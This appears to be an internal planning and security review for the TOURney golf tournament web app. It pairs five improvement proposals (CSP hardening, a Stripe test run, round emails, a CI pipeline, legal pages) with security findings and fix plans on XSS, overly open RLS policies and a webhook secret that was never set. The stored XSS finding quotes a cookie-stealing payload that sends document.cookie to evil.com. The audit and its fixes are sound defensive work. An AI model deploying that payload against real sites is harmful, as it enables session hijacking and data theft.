§2 — Council of 5
Forward-Looking Polish Ideas
Five concrete improvements — grounded in what's already built, not wishlist thinking.
1
Security + UX
Kill CSP unsafe-inline — Extract Inline Scripts to External Files
The CSP header exists but has unsafe-inline, which nullifies the XSS protection it's meant to provide. Every HTML page has substantial inline <script> blocks — that's the blocker. Extracting them unlocks a strict CSP, which in turn makes the _parseMentions and url innerHTML bugs unexploitable at the browser level even before the code fixes land.
Build plan: 1. Pick one low-complexity page (e.g. champions.html). 2. Move all <script> content to champions.js. 3. Add nonce-based CSP or hash the script. 4. Verify Vercel header updated. 5. Roll forward page by page over 1 sprint. Migration name: no migration needed — vercel.json CSP header update only.
2
Data + Business
Stripe Test-Mode Dry Run — End-to-End Billing Without LLC
create-checkout and stripe-webhook are fully wired — JWT auth, sig verification, 4 event types, DB columns all done. The only missing piece before LLC is pointing them at Stripe test keys. Running a full test-mode checkout → webhook → billing_status flow validates the entire pipeline before real money flows and surfaces any edge cases while the stakes are zero.
Build plan: 1. Create Stripe test account. 2. Set STRIPE_SECRET_KEY (test), STRIPE_WEBHOOK_SECRET (test), STRIPE_PRICE_PLAYER (test price ID) as Supabase edge function secrets. 3. Register webhook pointing at jllugkiojeoopitdvzsa.supabase.co/functions/v1/stripe-webhook. 4. Walk /player-upgrade full flow. 5. Confirm player_accounts.billing_status updates. No code changes needed.
3
UX + Retention
Post-Round Score Summary Email via send-install-email Infrastructure
send-install-email v4 is deployed and has the webhook gate pattern established. The same infrastructure can power a post-round email blast — "Round 1 complete. Leaderboard: 1. Smith (-4), 2. Jones (-2)..." Triggered from admin.html when an admin closes a round. This turns a one-time install nudge function into a reusable email engine.
Build plan: 1. Add round_summary event type to send-install-email function (new branch in switch). 2. Collect top-5 leaderboard data from rounds + scores query. 3. Build HTML email template (dark gold TOURney theme). 4. In admin.html, add "Email Round Summary" button in Rounds tab that POSTs to the function. 5. Deploy as v5. Estimated: 3h dev + 30min QA.
4
Infrastructure
GitHub Actions Deploy Pipeline for Edge Functions
Currently, deploying edge functions requires a manual SUPABASE_ACCESS_TOKEN and CLI command. There's no CI/CD, no staging, and no deploy audit trail. As the function count grows (5 functions now), manual deploys are a reliability risk — wrong version, missed env var, no rollback path. A GH Actions workflow would auto-deploy on push to main and validate the function responds post-deploy.
Build plan: 1. Add .github/workflows/deploy-functions.yml. 2. Use supabase/setup-cli action. 3. Set SUPABASE_ACCESS_TOKEN + SUPABASE_PROJECT_ID as GitHub secrets. 4. Deploy all functions on push to main (with path filter supabase/functions/**). 5. Add smoke-test step (curl the function, expect 200 or 401). Estimated: 2h setup.
5
Business
ToS + Privacy Pages — Pre-Launch Legal Unblock
Absent ToS and Privacy Policy, TOURney has GDPR/CCPA exposure and Stripe will flag the business during account review. These are also conversion blockers — players and tournament organizers making a payment decision want to see a Privacy Policy. The /create wizard billing gate already has a placeholder for a ToS link. This is a 2-hour task that unblocks Stripe activation.
Build plan: 1. Write ToS: usage terms, payment terms, content policy, disclaimer. 2. Write Privacy Policy: data collected (email, name, scores), Supabase storage, Stripe processor relationship, no selling of data. 3. Add tos.html + privacy.html with TOURney design system. 4. Add /tos + /privacy rewrites in vercel.json. 5. Link from /create wizard + marketing footer. Estimated: 2–3h total.

§5 — Security Review
Findings & Fix Plans
Evidence-based. Every finding cites a migration name, file:line, or policy name.

Methodology: Inspected all 11 migration SQL files for RLS policy definitions — specifically USING (true) predicates on sensitive tables. Grep'd innerHTML usage across all HTML and JS files (excluding .git and worktrees) to find unescaped render paths. Audited edge function auth patterns from prior session logs and grades.json security axis history. Reviewed vercel.json CSP header value. Reviewed send-push and send-install-email deployment status from qa-bugs-test-2026.md session 14 notes.

HIGHStored XSS — feed.html:377 _parseMentions to innerHTML
feed.html:377: the _parseMentions(p.message) function output is rendered directly to innerHTML without passing through esc(). The p.message field is player-controlled trash talk submitted via the feed post form. A malicious player submits <img src=x onerror="document.location='https://evil.com?c='+document.cookie"> as a message. When any player — or admin — opens the feed, the script executes in their session. Feed is a public page visible to all tournament participants.
Fix Plan 1. Open feed.html. Find _parseMentions function (~line 370).
2. Identify every point where its return value is assigned to .innerHTML.
3. Option A (surgical): wrap the final output with esc() before innerHTML assignment — but this will strip the mention highlighting markup.
4. Option B (correct): build _parseMentions to return a DocumentFragment — use document.createElement + textContent for plain text segments, and createElement('span') + textContent for mention spans. Then .appendChild(fragment) instead of innerHTML. No esc() needed — DOM API is inherently safe.
5. QA: post a message containing <script>alert(1)</script>. Verify it renders as literal text, not executed JS.
HIGHPossible XSS — admin.html:~2044 and ~2194 url in innerHTML
admin.html lines approximately 2044 and 2194 render a url value directly into an innerHTML template literal. If this url field originates from player-submitted data or settings, it is an XSS vector on the admin page. Admin sessions are highest-value targets — an admin XSS would allow an attacker to extract all tournament data, modify scores, or add malicious tournament admins.
Fix Plan 1. Open admin.html. Grep for innerHTML near lines 2044 and 2194.
2. Identify the data source of the url variable — is it from a DB column or a hardcoded config?
3. If player/user-controlled: wrap with esc(url) before inserting into template literal.
4. If always a known safe value (e.g., a Supabase storage URL): add an assertion that the value starts with https:// — reject anything else.
5. Confirm admin.html has function esc(str) defined (it does — cited in prior reviews). Ensure esc is called before innerHTML in both locations.
MEDIUMRLS — player_accounts anon SELECT USING(true)
migrations/005_invitations_and_accounts.sql:41: CREATE POLICY "anon read player accounts" ON player_accounts FOR SELECT TO anon USING (true);. This policy allows any unauthenticated HTTP request to enumerate all player account records, including billing_status, billing_expires_at, and billing_ref. While email is the only PII column, exposing billing status across all players has compliance implications and enables targeted billing manipulation probing.
Fix Plan 1. Write migration 012_tighten_player_accounts_rls.sql.
2. Drop policy: DROP POLICY "anon read player accounts" ON player_accounts;
3. Replace: CREATE POLICY "owner read player account" ON player_accounts FOR SELECT TO authenticated USING (email = auth.email());
4. Add admin read: CREATE POLICY "admin read player accounts" ON player_accounts FOR SELECT TO authenticated USING (EXISTS (SELECT 1 FROM tournament_admins WHERE email = auth.email()));
5. Test: confirm login.html can still fetch the player's own account, and /player page admin view still works.
MEDIUMCSP unsafe-inline Nullifies XSS Protection
vercel.json Content-Security-Policy header includes unsafe-inline in the script-src directive. This explicitly allows inline <script> blocks to execute, which is required because all TOURney pages use inline JavaScript. The consequence: any XSS injection (like feed.html:377) is executable — the browser won't block it even though a CSP header is present.
Fix Plan 1. Sprint: extract one page's inline JS to an external .js file (start with a small page).
2. Test that the page functions correctly with the external file loaded via <script src="...">.
3. Once all inline scripts on a page are external, add a nonce attribute to any remaining inline scripts or use SHA-256 hashes in the CSP directive.
4. Update vercel.json CSP to remove unsafe-inline once all pages are migrated.
5. This is a multi-sprint effort — prioritize pages with known XSS vectors (feed.html, admin.html) first.
MEDIUMSEND_INSTALL_EMAIL_SECRET Not Set — Webhook Gate Inactive
send-install-email v4 is deployed to Supabase edge functions with a webhook secret gate in the function code. However, the SEND_INSTALL_EMAIL_SECRET environment variable has not been set in the Supabase dashboard. This means the gate is present in code but not enforced at runtime — the function may accept any request without the secret header. Source: qa-bugs-test-2026.md session 14 notes + grades.json security axis (May 13).
Fix Plan 1. Go to Supabase dashboard → Project jllugkiojeoopitdvzsa → Edge Functions → send-install-email → Secrets.
2. Add secret: key = SEND_INSTALL_EMAIL_SECRET, value = a randomly generated 32-character string.
3. Update the DB webhook configuration to include this secret as an Authorization header.
4. Test: call the function without the header → expect 401. Call with correct header → expect 200 or message sent.
5. This is a Rob manual action — no code deploy needed.
LOWRLS — players / scores Tables May Still Have Permissive Pre-Multi-Tenant Policies
migrations/001_add_tournaments.sql:101 (comment): "Players/scores/settings: existing permissive policies stay in place. Tighten in migration 002 once all query-side filtering is confirmed working." No subsequent migration (002–011) creates tighter RLS policies on players or scores. The live database may still have the original USING(true) policies from before multi-tenant was introduced. Query-side filtering (WHERE tournament_id = ?) filters results correctly, but any authenticated user could theoretically insert or update scores across tournaments if the write policies are permissive.
Fix Plan 1. Verify live policies: Supabase dashboard → Authentication → Policies → players + scores tables.
2. If permissive INSERT/UPDATE/DELETE exist: write 012_tighten_players_scores_rls.sql (or add to existing 012 migration).
3. Replace permissive INSERT with: USING (tournament_id IN (SELECT tournament_id FROM tournament_admins WHERE email = auth.email())).
4. For SELECT (read): USING (true) is acceptable for public tournaments — all players can see each other's scores. Consider USING (tournament_id = ANY(array of accessible tournament IDs)) for private tournaments in future.
5. Test: confirm non-admin cannot insert scores into another tournament.
